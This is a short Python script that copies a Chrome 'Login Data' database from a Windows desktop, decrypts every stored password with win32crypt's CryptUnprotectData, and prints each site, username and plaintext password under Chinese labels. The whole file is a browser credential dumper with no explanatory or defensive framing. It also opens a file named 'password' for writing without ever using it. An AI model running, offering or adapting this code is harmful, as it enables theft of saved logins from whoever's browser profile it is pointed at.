import os, sys
import shutil
import sqlite3
import win32crypt

db_file_path = os.path.join(r'C:\Users\13164\Desktop\Login Data')
print(db_file_path)

tmp_file = os.path.join(os.path.dirname(sys.executable), 'tmp_tmp_tmp')
print(tmp_file)
if os.path.exists(tmp_file):
    os.remove(tmp_file)
shutil.copyfile(db_file_path, tmp_file)

conn = sqlite3.connect(tmp_file)
f = open('password', 'wb+')
for row in conn.execute('select signon_realm,username_value,password_value from logins'):
    # print(row)
    try:
        ret = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)
    except:
        continue
    print('网站：%-50s，用户名：%-20s，密码：%s' % (row[0][:50], row[1], ret[1].decode('gbk')))

conn.close()
os.remove(tmp_file)
